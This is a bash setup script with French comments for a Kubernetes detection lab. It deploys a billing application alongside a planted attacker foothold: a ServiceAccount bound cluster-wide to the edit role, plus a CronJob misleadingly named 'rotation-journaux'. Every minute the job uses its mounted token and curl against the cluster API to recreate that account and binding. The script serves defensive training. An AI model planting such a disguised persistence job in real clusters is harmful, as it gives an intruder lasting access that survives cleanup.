#!/usr/bin/env bash
# Pose la situation du lab k8s-detecter-une-persistance, fausse sur les cinq
# états par construction :
#
#   - l'application légitime de facturation : un Deployment de deux réplicas,
#     son Service, son identité (le ServiceAccount facturation, lié au
#     ClusterRole view DANS le namespace) et un CronJob légitime, purge-factures,
#     planifié la nuit ;
#   - l'accès de l'attaquant : le ServiceAccount support-n2, lié au ClusterRole
#     edit POUR TOUT LE CLUSTER par le ClusterRoleBinding support-n2 ;
#   - le Pod d'origine, outil-debug, qui tourne sous ce compte ;
#   - la persistance : le CronJob rotation-journaux, chaque minute, sous
#     l'identité rotation-journaux. Elle a juste les droits de recréer le compte
#     et sa liaison : créer des ServiceAccounts et des ClusterRoleBindings, et
#     le verbe bind sur le seul ClusterRole edit.
#
# L'UID du CronJob est relevé dans /var/lib/dsoxlab-labs : le constat de
# l'apprenant doit le porter, preuve qu'il a été exporté de l'objet vivant,
# donc avant sa suppression.
#
# Rejouable : tout ce qu'un passage précédent a laissé est retiré d'abord, le
# CronJob AVANT les liaisons, sans quoi il les recréerait aussitôt.
set -euo pipefail
# La trace complète va dans un journal sur le nœud : dsoxlab ne montre que
# « non-zero return code » quand ce script échoue, et le validateur relit
# ce fichier pour dire pourquoi.
exec > >(tee /var/log/dsoxlab-prepare.log) 2>&1
set -x

NS=facturation
REFERENCE=/var/lib/dsoxlab-labs/k8s-detecter-une-persistance.uid

# 1. Ce qu'un passage précédent aurait laissé.
if kubectl get namespace "$NS" >/dev/null 2>&1; then
  kubectl -n "$NS" delete cronjob rotation-journaux --ignore-not-found --cascade=foreground --wait=true --timeout=120s
  kubectl delete namespace "$NS" --ignore-not-found --wait=true --timeout=180s
fi
if [[ "$(kubectl get namespace "$NS" -o jsonpath='{.status.phase}' 2>/dev/null)" == "Terminating" ]]; then
  kubectl wait --for=delete "namespace/$NS" --timeout=180s
fi
kubectl delete clusterrolebinding support-n2 rotation-journaux --ignore-not-found
kubectl delete clusterrole rotation-journaux --ignore-not-found
# Toute autre liaison de cluster qui nommerait encore un compte de facturation.
kubectl get clusterrolebindings -o json \
  | python3 -c 'import json,sys; [print(b["metadata"]["name"]) for b in json.load(sys.stdin)["items"] if any(s.get("kind") == "ServiceAccount" and s.get("namespace") == "facturation" for s in b.get("subjects") or [])]' \
  | xargs -r kubectl delete clusterrolebinding
rm -f /root/constat-persistance.yaml "$REFERENCE"

# 2. La situation.
kubectl create namespace "$NS"

cat <<'YAML' | kubectl apply -f -
apiVersion: v1
kind: ServiceAccount
metadata:
  name: facturation
  namespace: facturation
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: facturation-lecture
  namespace: facturation
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: view
subjects:
  - kind: ServiceAccount
    name: facturation
    namespace: facturation
---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: facturation
  namespace: facturation
  labels:
    app: facturation
spec:
  replicas: 2
  selector:
    matchLabels:
      app: facturation
  template:
    metadata:
      labels:
        app: facturation
    spec:
      serviceAccountName: facturation
      containers:
        - name: web
          image: nginx:1.30.5@sha256:9bf97bd7714f5e24c1ccd545ecb9eb5435cb6d109c97cebb15e7e455e0239edb
          ports:
            - containerPort: 80
---
apiVersion: v1
kind: Service
metadata:
  name: facturation
  namespace: facturation
spec:
  selector:
    app: facturation
  ports:
    - port: 80
      targetPort: 80
---
apiVersion: batch/v1
kind: CronJob
metadata:
  name: purge-factures
  namespace: facturation
  labels:
    app: facturation
spec:
  schedule: "0 3 * * *"
  successfulJobsHistoryLimit: 1
  failedJobsHistoryLimit: 1
  jobTemplate:
    spec:
      template:
        spec:
          serviceAccountName: facturation
          restartPolicy: Never
          containers:
            - name: purge
              image: busybox:1.38.0@sha256:a46257e06c82ad85242d0d38077d0a52d9896389ca60a1a59d3463db586e5fa4
              command: ["sh", "-c", "echo purge des factures de plus de dix ans"]
---
apiVersion: v1
kind: ServiceAccount
metadata:
  name: support-n2
  namespace: facturation
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: support-n2
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: edit
subjects:
  - kind: ServiceAccount
    name: support-n2
    namespace: facturation
---
apiVersion: v1
kind: ServiceAccount
metadata:
  name: rotation-journaux
  namespace: facturation
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: rotation-journaux
rules:
  - apiGroups: [""]
    resources: ["serviceaccounts"]
    verbs: ["create"]
  - apiGroups: ["rbac.authorization.k8s.io"]
    resources: ["clusterrolebindings"]
    verbs: ["create"]
  - apiGroups: ["rbac.authorization.k8s.io"]
    resources: ["clusterroles"]
    verbs: ["bind"]
    resourceNames: ["edit"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: rotation-journaux
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: rotation-journaux
subjects:
  - kind: ServiceAccount
    name: rotation-journaux
    namespace: facturation
---
apiVersion: batch/v1
kind: CronJob
metadata:
  name: rotation-journaux
  namespace: facturation
spec:
  schedule: "* * * * *"
  concurrencyPolicy: Forbid
  successfulJobsHistoryLimit: 1
  failedJobsHistoryLimit: 1
  jobTemplate:
    spec:
      backoffLimit: 0
      activeDeadlineSeconds: 50
      template:
        spec:
          serviceAccountName: rotation-journaux
          restartPolicy: Never
          containers:
            - name: rotation
              image: curlimages/curl:8.22.0@sha256:58adaa4e8dca9c988bae2aba4ab3434a0bb2da16bbe3f92dec39ec7785166777
              command:
                - sh
                - -c
                - |
                  D=/var/run/secrets/kubernetes.io/serviceaccount
                  API=https://kubernetes.default.svc
                  T="$(cat "$D/token")"
                  curl -s -o /dev/null --cacert "$D/ca.crt" -H "Authorization: Bearer $T" \
                    -H "Content-Type: application/json" -X POST \
                    "$API/api/v1/namespaces/facturation/serviceaccounts" \
                    -d '{"apiVersion":"v1","kind":"ServiceAccount","metadata":{"name":"support-n2","namespace":"facturation"}}'
                  curl -s -o /dev/null --cacert "$D/ca.crt" -H "Authorization: Bearer $T" \
                    -H "Content-Type: application/json" -X POST \
                    "$API/apis/rbac.authorization.k8s.io/v1/clusterrolebindings" \
                    -d '{"apiVersion":"rbac.authorization.k8s.io/v1","kind":"ClusterRoleBinding","metadata":{"name":"support-n2"},"roleRef":{"apiGroup":"rbac.authorization.k8s.io","kind":"ClusterRole","name":"edit"},"subjects":[{"kind":"ServiceAccount","name":"support-n2","namespace":"facturation"}]}'
                  echo rotation terminee
---
apiVersion: v1
kind: Pod
metadata:
  name: outil-debug
  namespace: facturation
  labels:
    app: outil-debug
spec:
  serviceAccountName: support-n2
  containers:
    - name: outil
      image: curlimages/curl:8.22.0@sha256:58adaa4e8dca9c988bae2aba4ab3434a0bb2da16bbe3f92dec39ec7785166777
      command: ["sh", "-c", "sleep infinity"]
YAML

kubectl -n "$NS" rollout status deployment/facturation --timeout=180s
kubectl -n "$NS" wait --for=condition=Ready pod/outil-debug --timeout=180s

# 3. La référence du constat : l'UID du CronJob vivant, lisible par root seul.
mkdir -p "$(dirname "$REFERENCE")"
kubectl -n "$NS" get cronjob rotation-journaux -o jsonpath='{.metadata.uid}' > "$REFERENCE"
chmod 0600 "$REFERENCE"
test -s "$REFERENCE"

# La situation est posée quand l'accès de l'attaquant est réel.
test "$(kubectl auth can-i list secrets --all-namespaces --as system:serviceaccount:facturation:support-n2)" = yes
echo "Situation posée : support-n2 a edit sur tout le cluster, et rotation-journaux le recrée chaque minute."
